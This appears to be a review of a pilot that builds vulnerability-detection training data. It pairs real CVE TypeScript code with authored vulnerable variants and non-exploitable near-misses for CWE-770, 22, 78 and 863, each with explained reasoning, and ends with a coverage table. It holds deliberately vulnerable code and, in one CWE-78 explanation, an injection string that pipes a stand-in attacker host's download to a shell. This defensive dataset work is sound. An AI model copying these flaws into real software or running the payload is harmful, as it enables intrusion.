# TypeScript augmentation pilot - review

For each CWE: the **real CVE pair** first, then **authored variants** (same flaw,
written differently) and **near-misses** (looks vulnerable, is not exploitable).

The question to answer while reading: **does the authored code read like real
project code?** If it reads like a tutorial, that is the failure mode that made
`shape_react_syn` score 100% while real React scored 41% - and we should stop.

Near-misses deliberately change the **source**, never the guard, so the label is
checkable by reading rather than a judgement call.

---

# CWE-770

## REAL CVE - CVE-2026-39313 (QuantGeekDev/mcp-framework)

file: `src/transports/http/server.ts` - fix verified: verified_same_commit - CWE from: cisa

### VULN (real code from the CVE)
```typescript
}

  private async readRequestBody(req: IncomingMessage): Promise<any> {
    return new Promise((resolve, reject) => {
      let body = '';
      req.on('data', (chunk) => {
        body += chunk.toString();
      });
      req.on('end', () => {
```

### SAFE (real code from the CVE)
```typescript
}

  private async readRequestBody(req: IncomingMessage): Promise<any> {
    const maxSize = this._config.maxMessageSize ?? 4 * 1024 * 1024;
    return new Promise((resolve, reject) => {
      let body = '';
      let size = 0;
      req.on('data', (chunk) => {
        size += chunk.length;
        if (size > maxSize) {
          req.destroy();
          reject(new Error(`Request body exceeds maximum size of ${maxSize} bytes`));
          return;
        }
        body += chunk.toString();
      });
      req.on('end', () => {
```

## AUTHORED VARIANTS - same flaw, different surface

### variant_vuln #1 - status: confirmed
```typescript
// src/transports/ws/session.ts
  private async collect(req: IncomingMessage): Promise<string> {
    const chunks: Buffer[] = [];
    for await (const chunk of req) {
      chunks.push(chunk as Buffer);
    }
    return Buffer.concat(chunks).toString("utf8");
  }
```

**Reasoning taught:**

> Hypothesis: `chunk` is attacker-influenced and reaches `chunks.push` - a possible CWE-770.
> Trigger path: `for await` over the request pushes every chunk into `chunks` with no size accounting. A client that keeps streaming grows the array until the process exhausts memory - the same flaw as string concatenation, written with an async iterator instead of an event handler.
> Defensive check: I look for a control constraining `chunk` before `chunks.push` and find none that holds.
> The mechanism is therefore intact, so this is exploitable. Confirmed CWE-770.

### variant_vuln #2 - status: confirmed
```typescript
// src/transports/http/upload.ts
  handleUpload(req: IncomingMessage, res: ServerResponse) {
    const parts: string[] = [];
    req.setEncoding("utf8");
    req.on("data", (c: string) => parts.push(c));
    req.on("end", () => res.end(JSON.stringify({ length: parts.join("").length })));
  }
```

**Reasoning taught:**

> Hypothesis: `c` is attacker-influenced and reaches `parts.push` - a possible CWE-770.
> Trigger path: each decoded chunk is pushed into `parts` unbounded; the join at the end materialises the whole client-controlled payload a second time, so peak memory is twice what the attacker sent and still uncapped.
> Defensive check: I look for a control constraining `c` before `parts.push` and find none that holds.
> The mechanism is therefore intact, so this is exploitable. Confirmed CWE-770.

## AUTHORED NEAR-MISSES - vulnerable shape, NOT exploitable

### nearmiss_safe #1 - status: safe
```typescript
// src/transports/http/replay.ts
  private async collectFixture(name: string): Promise<string> {
    const chunks: Buffer[] = [];
    const file = createReadStream(join(FIXTURE_DIR, FIXTURES[name]));
    for await (const chunk of file) {
      chunks.push(chunk as Buffer);
    }
    return Buffer.concat(chunks).toString("utf8");
  }
```

**Reasoning taught:**

> Hypothesis: `FIXTURES[name]` reaches `chunks.push`, which is the shape of CWE-770 - check whether the mechanism is actually present.
> Trigger path: the call structure matches the vulnerable pattern, so shape alone does not settle it.
> Defensive check: the accumulation is identical in shape to the vulnerable version, but the stream is a file chosen from the fixed `FIXTURES` map inside `FIXTURE_DIR`. No caller can introduce data of unbounded size, so there is nothing for an attacker to grow.
> Because source is a constant map lookup, not request data, the mechanism CWE-770 depends on is absent and the hypothesis is refuted.

### nearmiss_safe #2 - status: safe
```typescript
// src/transports/http/server.ts
  private async readBounded(req: IncomingMessage): Promise<string> {
    const declared = Number(req.headers["content-length"] ?? "0");
    if (!Number.isFinite(declared) || declared > this._config.maxMessageSize) {
      throw new Error("payload too large");
    }
    const buf = Buffer.allocUnsafe(declared);
    let off = 0;
    for await (const chunk of req) {
      off += (chunk as Buffer).copy(buf, off);
    }
    return buf.toString("utf8");
  }
```

**Reasoning taught:**

> Hypothesis: `req` reaches `chunk.copy`, which is the shape of CWE-770 - check whether the mechanism is actually present.
> Trigger path: the call structure matches the vulnerable pattern, so shape alone does not settle it.
> Defensive check: this DOES read request data, so the source is attacker-controlled - but the allocation is fixed at `declared` bytes, which is rejected before allocation if it exceeds `maxMessageSize`. Memory is bounded by configuration, so the resource-exhaustion mechanism is absent.
> Because allocation size is validated against a configured ceiling first, the mechanism CWE-770 depends on is absent and the hypothesis is refuted.

---

# CWE-22

## REAL CVE - CVE-2026-32033 (openclaw/openclaw)

file: `src/agents/pi-tools.read.ts` - fix verified: verified_same_commit - CWE from: cisa

### VULN (real code from the CVE)
```typescript
// src/agents/sandbox/fs-paths.ts
function isPathInsideHost(root: string, target: string): boolean {
  const canonicalRoot = resolveSandboxHostPathViaExistingAncestor(path.resolve(root));
  const canonicalTarget = resolveSandboxHostPathViaExistingAncestor(path.resolve(target));
  const rel = path.relative(canonicalRoot, canonicalTarget);
  if (!rel) {
    return true;
  }
  return !(rel.startsWith("..") || path.isAbsolute(rel));
}

// src/agents/pi-tools.read.ts
function mapContainerPathToWorkspaceRoot(params: {
  filePath: string;
  root: string;
  containerWorkdir?: string;
}): string {
  const containerWorkdir = params.containerWorkdir?.trim();
  if (!containerWorkdir) {
    return params.filePath;
  }
  const normalizedWorkdir = containerWorkdir.replace(/\\/g, "/").replace(/\/+$/, "");
  if (!normalizedWorkdir.startsWith("/")) {
    return params.filePath;
  }
  if (!normalizedWorkdir) {
    return params.filePath;
  }

  let candidate = params.filePath;
  if (/^file:\/\//i.test(candidate)) {
    try {
      candidate = fileURLToPath(candidate);
    } catch {
      try {
        const parsed = new URL(candidate);
        if (parsed.protocol !== "file:") {
          return param
```

### SAFE (real code from the CVE)
```typescript
// src/agents/sandbox/fs-paths.ts
function isPathInsideHost(root: string, target: string): boolean {
  const canonicalRoot = resolveSandboxHostPathViaExistingAncestor(path.resolve(root));
  const resolvedTarget = path.resolve(target);
  // Preserve the final path segment so pre-existing symlink leaves are validated
  // by the dedicated symlink guard later in the bridge flow.
  const canonicalTargetParent = resolveSandboxHostPathViaExistingAncestor(
    path.dirname(resolvedTarget),
  );
  const canonicalTarget = path.resolve(canonicalTargetParent, path.basename(resolvedTarget));
  const rel = path.relative(canonicalRoot, canonicalTarget);
  if (!rel) {
    return true;
  }
  return !(rel.startsWith("..") || path.isAbsolute(rel));
}

// src/agents/pi-tools.read.ts
function mapContainerPathToWorkspaceRoot(params: {
  filePath: string;
  root: string;
  containerWorkdir?: string;
}): string {
  const containerWorkdir = params.containerWorkdir?.trim();
  if (!containerWorkdir) {
    return params.filePath;
  }
  const normalizedWorkdir = containerWorkdir.replace(/\\/g, "/").replace(/\/+$/, "");
  if (!normalizedWorkdir.startsWith("/")) {
    return params.filePath;
  }
  if (!normaliz
```

## AUTHORED VARIANTS - same flaw, different surface

### variant_vuln #1 - status: confirmed
```typescript
// src/agents/attachment.ts
export async function loadAttachment(name: string): Promise<Buffer> {
  const target = path.resolve(ATTACH_ROOT, name);
  return await fs.readFile(target);
}
```

**Reasoning taught:**

> Hypothesis: `name` is attacker-influenced and reaches `fs.readFile` - a possible CWE-22.
> Trigger path: `path.resolve` does not constrain the result to `ATTACH_ROOT` - it happily resolves `../../etc/passwd` to a path outside it, and an absolute `name` discards the base entirely. Any file the process can read is reachable.
> Defensive check: I look for a control constraining `name` before `fs.readFile` and find none that holds.
> The mechanism is therefore intact, so this is exploitable. Confirmed CWE-22.

### variant_vuln #2 - status: confirmed
```typescript
// src/agents/export.ts
export function streamReport(id: string, res: ServerResponse) {
  const file = `${REPORT_DIR}/${id}.json`;
  createReadStream(file).pipe(res);
}
```

**Reasoning taught:**

> Hypothesis: `id` is attacker-influenced and reaches `createReadStream` - a possible CWE-22.
> Trigger path: string interpolation builds the path, so `id` containing `../` walks out of `REPORT_DIR`, and the `.json` suffix is defeated by a NUL byte or by an `id` that itself ends in a traversal to a chosen file. The stream is piped straight to the response, exfiltrating it.
> Defensive check: I look for a control constraining `id` before `createReadStream` and find none that holds.
> The mechanism is therefore intact, so this is exploitable. Confirmed CWE-22.

## AUTHORED NEAR-MISSES - vulnerable shape, NOT exploitable

### nearmiss_safe #1 - status: safe
```typescript
// src/agents/preset.ts
export async function loadPreset(kind: PresetKind): Promise<Buffer> {
  const target = path.resolve(PRESET_ROOT, PRESET_FILES[kind]);
  return await fs.readFile(target);
}
```

**Reasoning taught:**

> Hypothesis: `PRESET_FILES[kind]` reaches `fs.readFile`, which is the shape of CWE-22 - check whether the mechanism is actually present.
> Trigger path: the call structure matches the vulnerable pattern, so shape alone does not settle it.
> Defensive check: structurally identical to the vulnerable `loadAttachment` - resolve against a root, then read - but the filename comes from `PRESET_FILES` keyed by the union type `PresetKind`. The set of reachable paths is fixed at compile time, so no input selects a path outside the root.
> Because filename is a lookup in a closed map keyed by a union type, the mechanism CWE-22 depends on is absent and the hypothesis is refuted.

### nearmiss_safe #2 - status: safe
```typescript
// src/agents/workspace.ts
export async function readWorkspaceFile(rel: string): Promise<Buffer> {
  const root = await fs.realpath(WORKSPACE_ROOT);
  const target = await fs.realpath(path.resolve(root, rel));
  if (!target.startsWith(root + path.sep)) {
    throw new Error("outside workspace");
  }
  return await fs.readFile(target);
}
```

**Reasoning taught:**

> Hypothesis: `rel` reaches `fs.readFile`, which is the shape of CWE-22 - check whether the mechanism is actually present.
> Trigger path: the call structure matches the vulnerable pattern, so shape alone does not settle it.
> Defensive check: `rel` IS attacker-controlled, but both sides are canonicalised with `realpath` before comparison, so symlinks and `..` segments are resolved before the containment test rather than after. A path that escapes the root fails the check and never reaches the read.
> Because canonicalise-then-compare, so the check cannot be bypassed by links, the mechanism CWE-22 depends on is absent and the hypothesis is refuted.

---

# CWE-78

## REAL CVE - CVE-2026-31994 (openclaw/openclaw)

file: `src/daemon/schtasks.ts` - fix verified: verified_same_commit - CWE from: cisa

### VULN (real code from the CVE)
```typescript
// src/daemon/schtasks.ts
function quoteCmdArg(value: string): string {
  if (!/[ \t"]/g.test(value)) {
    return value;
  }
  return `"${value.replace(/"/g, '\\"')}"`;
}
    // ...
function parseCommandLine(value: string): string[] {
  // `buildTaskScript` only escapes quotes (`\"`).
  // Keep all other backslashes literal so drive and UNC paths are preserved.
  return splitArgsPreservingQuotes(value, { escapeMode: "backslash-quote-only" });
}
    // ...
function buildTaskScript({
  description,
  programArguments,
  workingDirectory,
  environment,
}: GatewayServiceRenderArgs): string {
  const lines: string[] = ["@echo off"];
  if (description?.trim()) {
    lines.push(`rem ${description.trim()}`);
  }
  if (workingDirectory) {
    lines.push(`cd /d ${quoteCmdArg(workingDirectory)}`);
  }
  if (environment) {
    for (const [key, value] of Object.entries(environment)) {
      if (!value) {
        continue;
      }
      lines.push(renderCmdSetAssignment(key, value));
    }
  }
  const command = programArguments.map(quoteCmdArg).join(" ");
  lines.push(command);
  return `${lines.join("\r\n")}\r\n`;
}
    // ...
export async function installScheduledTask({
  env,
  stdout,
  pr
```

### SAFE (real code from the CVE)
```typescript
// src/daemon/schtasks.ts
function assertNoCmdLineBreak(value: string, field: string): void {
  if (/[\r\n]/.test(value)) {
    throw new Error(`${field} cannot contain CR or LF in Windows task scripts.`);
  }
}

function quoteSchtasksArg(value: string): string {
  if (!/[ \t"]/g.test(value)) {
    return value;
  }
  return `"${value.replace(/"/g, '\\"')}"`;
}

function quoteCmdScriptArg(value: string): string {
  assertNoCmdLineBreak(value, "Command argument");
  if (!value) {
    return '""';
  }
  const escaped = value.replace(/"/g, '\\"').replace(/%/g, "%%").replace(/!/g, "^!");
  if (!/[ \t"&|<>^()%!]/g.test(value)) {
    return escaped;
  }
  return `"${escaped}"`;
}

function unescapeCmdScriptArg(value: string): string {
  return value.replace(/\^!/g, "!").replace(/%%/g, "%");
}
    // ...
function parseCommandLine(value: string): string[] {
  // `buildTaskScript` escapes quotes (`\"`) and cmd expansions (`%%`, `^!`).
  // Keep all other backslashes literal so drive and UNC paths are preserved.
  return splitArgsPreservingQuotes(value, { escapeMode: "backslash-quote-only" }).map(
    unescapeCmdScriptArg,
  );
}
    // ...
function buildTaskScript({
  description,
  program
```

## AUTHORED VARIANTS - same flaw, different surface

### variant_vuln #1 - status: confirmed
```typescript
// src/convert/office.ts
export async function toPdf(filePath: string): Promise<string> {
  const out = `${filePath}.pdf`;
  await execAsync(`libreoffice --headless --convert-to pdf "${filePath}"`);
  return out;
}
```

**Reasoning taught:**

> Hypothesis: `filePath` is attacker-influenced and reaches `execAsync` - a possible CWE-78.
> Trigger path: the surrounding double quotes do not make this safe: a filePath containing a double quote closes the quoted section, after which `;` or `$( )` begins a command of the attacker's choosing, running with the server's privileges.
> Defensive check: I look for a control constraining `filePath` before `execAsync` and find none that holds.
> The mechanism is therefore intact, so this is exploitable. Confirmed CWE-78.

### variant_vuln #2 - status: confirmed
```typescript
// src/convert/media.ts
export function probe(url: string, cb: (e: Error | null, s?: string) => void) {
  exec("ffprobe -v quiet -print_format json -show_format " + url, (e, stdout) =>
    cb(e, stdout),
  );
}
```

**Reasoning taught:**

> Hypothesis: `url` is attacker-influenced and reaches `exec` - a possible CWE-78.
> Trigger path: `url` is concatenated with no quoting at all, so a value like `x; curl attacker.example | sh` is parsed by the shell as a second command. Being a URL-shaped string constrains nothing - it is plain text to the shell.
> Defensive check: I look for a control constraining `url` before `exec` and find none that holds.
> The mechanism is therefore intact, so this is exploitable. Confirmed CWE-78.

## AUTHORED NEAR-MISSES - vulnerable shape, NOT exploitable

### nearmiss_safe #1 - status: safe
```typescript
// src/convert/thumbnail.ts
export async function renderThumb(filePath: string): Promise<Buffer> {
  const { stdout } = await execFileAsync("convert", [filePath, "-resize", "128x128", "png:-"], {
    encoding: "buffer",
  });
  return stdout as unknown as Buffer;
}
```

**Reasoning taught:**

> Hypothesis: `filePath` reaches `execFileAsync`, which is the shape of CWE-78 - check whether the mechanism is actually present.
> Trigger path: the call structure matches the vulnerable pattern, so shape alone does not settle it.
> Defensive check: `filePath` is fully attacker-controlled and still reaches a process spawn - but `execFile` takes the program and an ARGUMENT ARRAY, and no shell is involved. `;`, `$( )` and quotes are ordinary characters in a filename, so there is no syntax for them to break into.
> Because argv array with no shell, so metacharacters cannot become syntax, the mechanism CWE-78 depends on is absent and the hypothesis is refuted.

### nearmiss_safe #2 - status: safe
```typescript
// src/convert/version.ts
export async function toolVersion(tool: ToolName): Promise<string> {
  const { stdout } = await execAsync(`${TOOL_BINARIES[tool]} --version`);
  return stdout.trim();
}
```

**Reasoning taught:**

> Hypothesis: `TOOL_BINARIES[tool]` reaches `execAsync`, which is the shape of CWE-78 - check whether the mechanism is actually present.
> Trigger path: the call structure matches the vulnerable pattern, so shape alone does not settle it.
> Defensive check: this DOES build a shell command string, which is the vulnerable shape - but the interpolated value is a binary path from the constant `TOOL_BINARIES` map keyed by the `ToolName` union. No input reaches the command line, so there is nothing for an attacker to inject.
> Because interpolated value is a constant lookup, not input, the mechanism CWE-78 depends on is absent and the hypothesis is refuted.

---

# CWE-863

## REAL CVE - CVE-2026-33577 (openclaw/openclaw)

file: `src/agents/tools/gateway.ts` - fix verified: verified_same_commit - CWE from: cisa

### VULN (real code from the CVE)
```typescript
// src/infra/node-pairing.ts
export async function getPairedNode(
  nodeId: string,
  baseDir?: string,
): Promise<NodePairingPairedNode | null> {
  const state = await loadState(baseDir);
  return state.pairedByNodeId[normalizeNodeId(nodeId)] ?? null;
}
    // ...
export async function approveNodePairing(
  requestId: string,
  baseDir?: string,
): Promise<{ requestId: string; node: NodePairingPairedNode } | null> {
  return await withLock(async () => {
    const state = await loadState(baseDir);
    const pending = state.pendingById[requestId];
    if (!pending) {
      return null;
    }

    const now = Date.now();
    const existing = state.pairedByNodeId[pending.nodeId];
    const node: NodePairingPairedNode = {
      nodeId: pending.nodeId,
      token: newToken(),
      displayName: pending.displayName,
      platform: pending.platform,
      version: pending.version,
      coreVersion: pending.coreVersion,
      uiVersion: pending.uiVersion,
      deviceFamily: pending.deviceFamily,
      modelIdentifier: pending.modelIdentifier,
      caps: pending.caps,
      commands: pending.commands,
      permissions: pending.permissions,
      remoteIp: pending.remoteIp,
      creat
```

### SAFE (real code from the CVE)
```typescript
// src/infra/node-pairing.ts
import { randomUUID } from "node:crypto";
import { resolveMissingRequestedScope } from "../shared/operator-scope-compat.js";
import { NODE_SYSTEM_RUN_COMMANDS } from "./node-commands.js";
import {
  createAsyncLock,
  pruneExpiredPending,
  readJsonFile,
  resolvePairingPaths,
  upsertPendingPairingRequest,
  writeJsonAtomic,
} from "./pairing-files.js";
    // ...
};

type NodePairingStateFile = {
  pendingById: Record<string, NodePairingPendingRequest>;
  pairedByNodeId: Record<string, NodePairingPairedNode>;
};

const PENDING_TTL_MS = 5 * 60 * 1000;
const OPERATOR_ROLE = "operator";
const OPERATOR_WRITE_SCOPE = "operator.write";
const OPERATOR_ADMIN_SCOPE = "operator.admin";

const withLock = createAsyncLock();

function resolveNodeApprovalRequiredScope(pending: NodePairingPendingRequest): string | null {
  const commands = Array.isArray(pending.commands) ? pending.commands : [];
  if (commands.some((command) => NODE_SYSTEM_RUN_COMMANDS.some((allowed) => allowed === command))) {
    return OPERATOR_ADMIN_SCOPE;
  }
  if (commands.length > 0) {
    return OPERATOR_WRITE_SCOPE;
  }
  return null;
}

type ApprovedNodePairingResult = { requestId: string;
```

## AUTHORED VARIANTS - same flaw, different surface

### variant_vuln #1 - status: confirmed
```typescript
// src/tools/permissions.ts
export function gate(input: ToolInput, ctx: PermissionContext): Decision {
  const decision = evaluatePolicy(input, ctx);
  if (decision.behavior !== "deny") {
    return { behavior: "allow" };
  }
  return decision;
}
```

**Reasoning taught:**

> Hypothesis: `input` is attacker-influenced and reaches `evaluatePolicy` - a possible CWE-863.
> Trigger path: the policy IS evaluated, so a reader sees an authorization check - but every outcome other than an explicit `deny` is converted into `allow`. An `ask` requiring confirmation, or an `unknown` from a policy that failed to load, both become permission granted. The check runs and enforces nothing.
> Defensive check: I look for a control constraining `input` before `evaluatePolicy` and find none that holds.
> The mechanism is therefore intact, so this is exploitable. Confirmed CWE-863.

### variant_vuln #2 - status: confirmed
```typescript
// src/tools/middleware.ts
export async function requireAdmin(req: RequestAuth, res: Response, next: () => void) {
  await authorize("admin", req, res, next);
  if (!req.user?.administrator) {
    throw Errors.ADMIN_ONLY;
  }
}
```

**Reasoning taught:**

> Hypothesis: `req` is attacker-influenced and reaches `authorize` - a possible CWE-863.
> Trigger path: `next` is handed to `authorize`, which invokes it to continue the middleware chain BEFORE the administrator test runs. The throw fires afterwards, by which time the request has already advanced to the protected handler. The guard is present, correct in isolation, and ordered too late to matter.
> Defensive check: I look for a control constraining `req` before `authorize` and find none that holds.
> The mechanism is therefore intact, so this is exploitable. Confirmed CWE-863.

## AUTHORED NEAR-MISSES - vulnerable shape, NOT exploitable

### nearmiss_safe #1 - status: safe
```typescript
// src/tools/permissions.ts
export function gate(input: ToolInput, ctx: PermissionContext): Decision {
  const decision = evaluatePolicy(input, ctx);
  if (decision.behavior === "deny" || decision.behavior === "ask") {
    return decision;
  }
  if (decision.behavior !== "allow") {
    return { behavior: "deny", reason: "unrecognised policy outcome" };
  }
  return decision;
}
```

**Reasoning taught:**

> Hypothesis: `input` reaches `evaluatePolicy`, which is the shape of CWE-863 - check whether the mechanism is actually present.
> Trigger path: the call structure matches the vulnerable pattern, so shape alone does not settle it.
> Defensive check: same shape as the vulnerable gate - evaluate, then branch on the outcome - but `deny` and `ask` are propagated, and anything not explicitly `allow` fails closed. No policy outcome silently becomes permission granted.
> Because enumerates outcomes explicitly and defaults to deny, the mechanism CWE-863 depends on is absent and the hypothesis is refuted.

### nearmiss_safe #2 - status: safe
```typescript
// src/tools/middleware.ts
export async function requireAdmin(req: RequestAuth, res: Response, next: () => void) {
  const session = await authorize("admin", req, res, () => {});
  if (!session || !session.user?.administrator) {
    throw Errors.ADMIN_ONLY;
  }
  next();
}
```

**Reasoning taught:**

> Hypothesis: `req` reaches `authorize`, which is the shape of CWE-863 - check whether the mechanism is actually present.
> Trigger path: the call structure matches the vulnerable pattern, so shape alone does not settle it.
> Defensive check: `authorize` is given a no-op instead of `next`, so it cannot advance the chain on its own. The session it returns is tested, and `next()` runs only after the administrator check passes - the control is on the path in the right order.
> Because continuation is withheld until after the authorization test, the mechanism CWE-863 depends on is absent and the hypothesis is refuted.

---

# Coverage - the gap

| CWE | real vuln | authored vuln | total |
|---|---|---|---|
| CWE-1321 | 1 | 0 | 1 |
| CWE-134 | 1 | 0 | 1 |
| CWE-178 | 1 | 0 | 1 |
| CWE-180 | 1 | 0 | 1 |
| CWE-184 | 1 | 0 | 1 |
| CWE-185 | 1 | 0 | 1 |
| CWE-20 | 2 | 0 | 2 |
| CWE-200 | 2 | 0 | 2 |
| CWE-202 | 1 | 0 | 1 |
| CWE-208 | 2 | 0 | 2 |
| CWE-22 | 4 | 2 | 6 |
| CWE-287 | 1 | 0 | 1 |
| CWE-288 | 1 | 0 | 1 |
| CWE-294 | 1 | 0 | 1 |
| CWE-306 | 1 | 0 | 1 |
| CWE-327 | 1 | 0 | 1 |
| CWE-347 | 1 | 0 | 1 |
| CWE-352 | 1 | 0 | 1 |
| CWE-367 | 2 | 0 | 2 |
| CWE-400 | 2 | 0 | 2 |
| CWE-441 | 2 | 0 | 2 |
| CWE-532 | 1 | 0 | 1 |
| CWE-59 | 3 | 0 | 3 |
| CWE-601 | 1 | 0 | 1 |
| CWE-613 | 2 | 0 | 2 |
| CWE-639 | 1 | 0 | 1 |
| CWE-693 | 1 | 0 | 1 |
| CWE-696 | 1 | 0 | 1 |
| CWE-77 | 1 | 0 | 1 |
| CWE-770 | 2 | 2 | 4 |
| CWE-78 | 2 | 2 | 4 |
| CWE-787 | 1 | 0 | 1 |
| CWE-79 | 3 | 0 | 3 |
| CWE-807 | 1 | 0 | 1 |
| CWE-829 | 1 | 0 | 1 |
| CWE-862 | 2 | 0 | 2 |
| CWE-863 | 4 | 2 | 6 |
| CWE-918 | 5 | 0 | 5 |
| CWE-94 | 2 | 0 | 2 |

**39 CWEs total. 23 still have only ONE vulnerable example.** 4 augmented.
